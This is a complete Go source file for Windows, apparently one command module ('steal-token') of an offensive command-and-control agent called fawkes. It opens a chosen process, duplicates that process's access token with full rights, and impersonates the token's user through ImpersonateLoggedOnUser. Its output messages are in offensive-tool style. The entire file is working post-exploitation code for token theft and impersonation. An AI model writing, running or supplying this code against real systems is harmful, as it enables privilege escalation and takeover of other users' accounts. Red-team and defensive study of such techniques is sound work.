//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	advapi32                = windows.NewLazySystemDLL("advapi32.dll")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf        = advapi32.NewProc("RevertToSelf")
)

type StealTokenCommand struct{}

func (c *StealTokenCommand) Name() string {
	return "steal-token"
}

func (c *StealTokenCommand) Description() string {
	return "Steal and impersonate a token from another process"
}

func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
	var params struct {
		PID int `json:"pid"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID == 0 {
		return structs.CommandResult{
			Output:    "PID is required",
			Status:    "error",
			Completed: true,
		}
	}

	output, err := stealToken(uint32(params.PID))
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to steal token: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func (c *StealTokenCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

func stealToken(pid uint32) (string, error) {
	var output string

	// Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened process %d\n", pid)

	// Open process token
	var hToken windows.Token
	err = windows.OpenProcessToken(
		hProcess,
		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY,
		&hToken,
	)
	if err != nil {
		return output, fmt.Errorf("failed to open process token: %v", err)
	}
	defer hToken.Close()
	output += "[+] Opened process token\n"

	// Get token user information to display who we're impersonating
	tokenUser, err := hToken.GetTokenUser()
	if err == nil {
		username, domain, _, err := tokenUser.User.Sid.LookupAccount("")
		if err == nil {
			output += fmt.Sprintf("[+] Token belongs to: %s\\%s\n", domain, username)
		}
	}

	// Duplicate the token for impersonation
	var hDupToken windows.Token
	err = windows.DuplicateTokenEx(
		hToken,
		windows.TOKEN_ALL_ACCESS,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&hDupToken,
	)
	if err != nil {
		return output, fmt.Errorf("failed to duplicate token: %v", err)
	}
	defer hDupToken.Close()
	output += "[+] Duplicated token\n"

	// Impersonate the token
	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(hDupToken))
	if ret == 0 {
		return output, fmt.Errorf("failed to impersonate token: %v", err)
	}
	output += "[+] Successfully impersonating token!\n"
	output += "[!] Use 'rev2self' to revert to original context\n"

	// Get current thread token to verify impersonation
	var hThreadToken windows.Token
	err = windows.OpenThreadToken(
		windows.CurrentThread(),
		windows.TOKEN_QUERY,
		false,
		&hThreadToken,
	)
	if err == nil {
		defer hThreadToken.Close()
		tokenUser, err := hThreadToken.GetTokenUser()
		if err == nil {
			username, domain, _, err := tokenUser.User.Sid.LookupAccount("")
			if err == nil {
				output += fmt.Sprintf("[+] Current context: %s\\%s\n", domain, username)
			}
		}
	}

	return output, nil
}
